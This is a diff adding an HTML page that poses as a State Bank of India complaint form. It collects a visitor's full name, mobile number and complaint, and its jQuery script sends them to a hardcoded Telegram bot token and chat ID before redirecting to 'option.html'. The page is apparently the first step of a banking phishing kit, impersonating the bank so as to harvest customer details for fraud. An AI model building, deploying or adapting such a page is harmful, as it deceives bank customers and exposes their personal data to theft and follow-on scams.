@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+  <title>Welcome To State Bank Of India</title>
+
+
+   <meta name="description" content="https://onlinesbi.co.in">
+    
+  <style>
+    
+    body{
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container{
+      width: 90%;
+      margin: 0px auto;
+      background-color: #fff;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .form-group{
+      margin-bottom: 20px;
+    }
+
+    label{
+      display: block;
+      margin-bottom: 5px;
+    }
+
+    input[type="text"],
+    input[type="tel"],
+    input[type="number"],
+    textarea {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid black;
+      border-radius: 4px;
+      box-sizing: border-box;
+      margin-bottom: 5px;
+
+    }
+
+    textarea{
+      height: 100px; /* Adjust the height as needed */
+      border: 1px solid black;
+    }
+
+    button{
+      background-color: #4CAF50;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      width: 100%;
+    }
+  
+.btn-custom{
+      background-color: #4CAF50; /* Set the background color to #4CAF50 */
+      border-color: #4CAF50; /* Set the border color to #4CAF50 */
+      color: #ffffff; /* Set the text color to white */
+    }
+    .btn-custom:hover{
+      background-color: #45A049; /* Set a slightly darker shade when hovered */
+      border-color: #45A049;
+    }
+    button:hover{
+      background-color: #45a049;
+    }
+  
+  img{
+      display: block;
+      margin: auto;
+      max-width: 100%; /* Ensure the image doesn't exceed the width of its container */
+      height: auto; /* Allow the image's height to scale proportionally to its width */
+    }
+
+    @media (max-width: 768px) {
+      img{
+        max-width: 100%; /* Adjust the max-width for smaller screens */
+      }
+    }
+  
+  
+  </style>
+</head>
+<body>
+  <img src="ICICI.jpg" alt="Girl in a jacket">
+  <div class="container">
+    <form id="myForm" onsubmit="submitForm(event)">
+      <div class="form-group row">
+        <div class="col-12">
+          <label for="fullname">Full Name:</label>
+          <input type="text" class="form-control" id="fullname" name="fullname" placeholder="Enter your full name" required>
+        </div>
+      </div>
+      <div class="form-group row">
+        <div class="col-12">
+          <label for="mobile">Mobile Number:</label>
+          <input type="tel" class="form-control" id="mobile" name="mobile" placeholder="Enter your mobile number" required>
+        </div>
+      </div>
+     
+      <div class="form-group row">
+        <div class="col-12">
+          <label for="complaint">Complaint:</label>
+          <textarea class="form-control2" id="complaint" name="complaint" placeholder="Enter your complaint"></textarea></div>
+      </div>
+      <div class="form-group row">
+        <div class="col-12">
+          <button type="submit" class="btn btn-custom">Submit</button>
+        </div>
+      </div>
+    </form>
+  </div>
+  <img src="foot.png" alt="Girl in a jacket">
+  
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@1.16.0/dist/umd/popper.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+<script>
+$('#myForm').on('submit', function(e) {
+    e.preventDefault();  // Prevent the form from being submitted
+
+    var name = $('#fullname').val();  // Replace these with
+    var tel = $('#mobile').val();     // your actual input form IDs
+    var complaint = $('#complaint').val();
+
+    var messageText = 'Name: ' + name + '\n' +
+                      'Mobile: ' + tel + '\n' +
+                      'Complaint: ' + complaint;
+    
+    var botToken = '7791287382:AAHaVcRNbpDfO1MOGYxvB4h6Ml7Bop5CxoQ'; // Replace with your bot token
+    var chatId = '7865807902'; // Replace with the chat ID where you want the message to be sent
+
+    var url = 'https://api.telegram.org/bot' + botToken + 
+              '/sendMessage?chat_id=' + chatId + 
+              '&text=' + encodeURI(messageText);
+
+    $.get(url, function(data, status){
+        console.log("Message sent: " + status);
+        // Redirect to a new page
+        window.location.href = 'option.html'; // Replace 'your_url' with the URL of page you want to redirect to
+    });
+});
+</script>
+</body>
+</html>
